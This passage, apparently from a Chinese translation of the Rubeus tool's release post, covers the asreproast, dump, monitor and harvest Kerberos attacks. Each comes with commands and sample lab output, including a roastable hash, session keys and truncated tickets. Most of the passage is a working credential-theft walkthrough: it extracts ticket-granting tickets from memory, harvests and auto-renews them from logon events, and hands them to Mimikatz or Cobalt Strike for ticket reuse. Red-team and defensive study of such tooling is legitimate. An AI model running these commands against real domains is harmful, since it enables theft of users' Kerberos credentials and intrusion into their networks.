c:Rubeus&gt;Rubeus.exe asreproast /user:dfm.a

   ______        _
  (_____       | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |   | |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.0.0

[*] Action: AS-REP Roasting

[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
[*] Building AS-REQ (w/o preauth) for: 'testlab.localdfm.a'
[*] Connecting to 192.168.52.100:88
[*] Sent 163 bytes
[*] Received 1537 bytes
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$dfm.a@testlab.local:F7310EA341128...(snip)..
```

### <a class="reference-link" name="dump"></a>dump

在已经管理员权限的情况下，**dump** 操作将从内存中提取当前的 TGT 和服务票据。可以使用 **/service** （使用 **/service:krbtgt** 来指定 TGT 票据）和 / 或 登录 ID （ **luid:X** 参数）来指定要提取的票据类型。操作将返回base64编码的blob 数据，并保存为KRB-CRED 文件（.kirbis）。此文件可被用于 **ptt** 操作，Mimikatz的 **kerberos::ptt** 功能，或者 Cobalt Strike 的 **kerberos_ticket_use** 操作。

```
c:Temptickets&gt;Rubeus.exe dump /service:krbtgt /luid:366300

   ______        _
  (_____       | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |   | |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.0.0


[*] Action: Dump Kerberos Ticket Data (All Users)

[*] Target LUID     : 0x596f6
[*] Target service  : krbtgt


  UserName                 : harmj0y
  Domain                   : TESTLAB
  LogonId                  : 366326
  UserSID                  : S-1-5-21-883232822-274137685-4173207997-1111
  AuthenticationPackage    : Kerberos
  LogonType                : Interactive
  LogonTime                : 9/17/2018 9:05:26 AM
  LogonServer              : PRIMARY
  LogonServerDNSDomain     : TESTLAB.LOCAL
  UserPrincipalName        : harmj0y@testlab.local

    [*] Enumerated 1 ticket(s):

    ServiceName              : krbtgt
    TargetName               : krbtgt
    ClientName               : harmj0y
    DomainName               : TESTLAB.LOCAL
    TargetDomainName         : TESTLAB.LOCAL
    AltTargetDomainName      : TESTLAB.LOCAL
    SessionKeyType           : aes256_cts_hmac_sha1
    Base64SessionKey         : AdI7UObh5qHL0Ey+n28oQpLUhfmgbAkpvcWJXPC2qKY=
    KeyExpirationTime        : 12/31/1600 4:00:00 PM
    TicketFlags              : name_canonicalize, pre_authent, initial, renewable, forwardable
    StartTime                : 9/17/2018 4:20:25 PM
    EndTime                  : 9/17/2018 9:20:25 PM
    RenewUntil               : 9/24/2018 2:05:26 AM
    TimeSkew                 : 0
    EncodedTicketSize        : 1338
    Base64EncodedTicket      :

      doIFNjCCBTKgAwIBBaEDAg...(snip)...


[*] Enumerated 4 total tickets
[*] Extracted  1 total tickets
```

**注意这个操作必须运行于管理员权限下，以获取其他用户的 Kerberos 票据！**

### <a class="reference-link" name="monitor"></a>monitor

**monitor** 操作将监视 4624 登录事件，并提取新登录 ID(LUID)的任意 TGT 票据。**、interval** 参数（以秒为单位，默认为60）来指定检查事件日志的频率。**/filteruser:X** 参数用于指定只返回特定用户的票据。此功能在没有设置约束委派的服务器上特别有用。

当 **/fiteruser** 指定的用户（如果未指定，则任何用户）创建一个新的4624登录事件时，将输出所有提取到的 TGT KRB-CRED 数据。

```
c:Rubeus&gt;Rubeus.exe monitor /filteruser:dfm.a

   ______        _
  (_____       | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |   | |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.0.0

[*] Action: TGT Monitoring
[*] Monitoring every 60 seconds for 4624 logon events
[*] Target user : dfm.a


[+] 9/17/2018 7:59:02 PM - 4624 logon event for 'TESTLAB.LOCALdfm.a' from '192.168.52.100'
[*] Target LUID     : 0x991972
[*] Target service  : krbtgt

  UserName                 : dfm.a
  Domain                   : TESTLAB
  LogonId                  : 10033522
  UserSID                  : S-1-5-21-883232822-274137685-4173207997-1110
  AuthenticationPackage    : Kerberos
  LogonType                : Network
  LogonTime                : 9/18/2018 2:59:02 AM
  LogonServer              :
  LogonServerDNSDomain     : TESTLAB.LOCAL
  UserPrincipalName        :

    ServiceName              : krbtgt
    TargetName               :
    ClientName               : dfm.a
    DomainName               : TESTLAB.LOCAL
    TargetDomainName         : TESTLAB.LOCAL
    AltTargetDomainName      : TESTLAB.LOCAL
    SessionKeyType           : aes256_cts_hmac_sha1
    Base64SessionKey         : orxXJZ/r7zbDvo2JUyFfi+2ygcZpxH8e6phGUT5zDbc=
    KeyExpirationTime        : 12/31/1600 4:00:00 PM
    TicketFlags              : name_canonicalize, renewable, forwarded, forwardable
    StartTime                : 9/17/2018 7:59:02 PM
    EndTime                  : 9/18/2018 12:58:59 AM
    RenewUntil               : 9/24/2018 7:58:59 PM
    TimeSkew                 : 0
    EncodedTicketSize        : 1470
    Base64EncodedTicket      :

      doIFujCCBbagAwIBBaE...(snip)...


[*] Extracted  1 total tickets
```

**注意此操作需要运行于管理员权限！**

### <a class="reference-link" name="harvest"></a>harvest

**harvest** 操作比 monitor 操作更进一步。它将持续地监视登陆日志中的4624事件，每间隔 **/interval:MIMUTES** 指定的时间，就针对新的登录事件，进行新的 TGT KRB-CRED 文件的提取，并将提取的 TGT 进行缓存。在 **/interval** 指定的时间间隔内，任何将在下一个时间间隔到期的 TGT 都将被自动续订（直到他们的续订期限），并且当前缓存的可用 / 有效的 TGT KRB-CRED .kirbis 文件将以 base64 编码的 blob 数据格式输出。

这就允许你在不用打开 LSASS 进程的读取句柄的情况下，收集系统中的可用 TGT。但是记住，提取票据的操作需要管理员权限。

```
c:Rubeus&gt;Rubeus.exe harvest /interval:30

   ______        _
  (_____       | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |   | |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v0.0.1a

[*] Action: TGT Harvesting (w/ auto-renewal)

[*] Monitoring every 30 minutes for 4624 logon events

...(snip)...

[*] Renewing TGT for dfm.a@TESTLAB.LOCAL
[*] Connecting to 192.168.52.100:88
[*] Sent 1520 bytes
[*] Received 1549 bytes

[*] 9/17/2018 6:43:02 AM - Current usable TGTs:

User                  :  dfm.a@TESTLAB.LOCAL
StartTime             :  9/17/2018 6:43:02 AM
EndTime               :  9/17/2018 11:43:02 AM
RenewTill             :  9/24/2018 2:07:48 AM
Flags                 :  name_canonicalize, renewable, forwarded, forwardable
Base64EncodedTicket   :

    doIFujCCBbagAw...(snip)...
```

**注意此操作需要运行于管理员权限！**

此功能可以和 [Seatbelt](https://github.com/GhostPack/Seatbelt) 的 **4624Events** 功能完美配合， **4624Events** 将解析最近七天内的4624登录事件，如果其中有感兴趣的用户以特定登陆类型定期进行认证的话，就会有可收集的 Kerberos TGT，**harvest** 功能可以帮你获取这些凭证。

### <a class="reference-link" name="Wrapup"></a>Wrapup

这个项目凝聚了血汗和泪水（Kerberos相关部分带来的），现在我怀着激动的心情将它交给攻击专家们。希望我们都开始拥抱 Kekeo 的强大功能，即使它是另外一个项目。

注意，此代码还是beta版，它已经在有限的环境中进行了测试，但我确信肯定还存在很多 bug 和问题。：）
